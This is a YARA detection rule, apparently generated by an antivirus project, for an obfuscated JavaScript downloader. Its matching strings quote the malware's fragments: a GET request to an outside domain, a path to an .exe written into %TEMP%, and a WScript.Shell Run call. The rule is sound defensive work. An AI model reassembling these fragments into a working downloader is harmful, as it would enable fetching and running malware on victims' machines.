rule sig_20160401_3f3c4bd35833fc1dd5148a21817c3060 {
  meta:
    description = "datamaliciousorder - file 20160401_3f3c4bd35833fc1dd5148a21817c3060.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5066a15017c3e93b3f352b66e2ceb4d24cfd9c8582e2650cdbf300c6a2e03dcf"

  strings:
    $s1  = "function OvfHi(GrLzm, KyQp){BigKu = BigKu * 1; return GrLzm - KyQp;};" fullword ascii
    $s2  = "if (LgiEio[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s3  = "LgiEio[OxAcd](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "function XzGgu() {return DqyIsi[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"975TF4EE7.ex\" + \"e\";};" fullword ascii
    $s5  = "var DqyIsi = function CgVau() {return WScript[VcAa](\"WScript\"+\".Shell\");}(), RqtHzs = 11;" fullword ascii
    $s6  = "function AgHu(){return NkvEko + \"\";};" fullword ascii
    $s7  = "function HhWth() {return ((MwSg == true) && (MwSg == ZozRv)) ? 1 : BigKu;};" fullword ascii
    $s8  = "function HhlOpe(GuZr){DqyIsi[\"R\"+\"un\"](GuZr, BigKu, BigKu);};" fullword ascii
    $s9  = "ZozRv = true; " fullword ascii
    $s10 = "var ChYae = false;" fullword ascii
    $s11 = "function GuPd()" fullword ascii
    $s12 = "var MwSg = false;" fullword ascii
    $s13 = "var YicDx = new this[\"Date\"]();" fullword ascii
    $s14 = "return OvfHi(RhkJml, IuCln);" fullword ascii
    $s15 = "function AzoWe(){return 23;};" fullword ascii
    $s16 = "function TpvLd(HzAjr) {var IwMwh = (1, 2, 3, 4, 5, HzAjr); return IwMwh;};" fullword ascii
    $s17 = "MwSg = true; " fullword ascii
    $s18 = "var ZozRv = false;" fullword ascii
    $s19 = "}while (CeqPqg);" fullword ascii
    $s20 = "function HmNy(){return VcAa;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}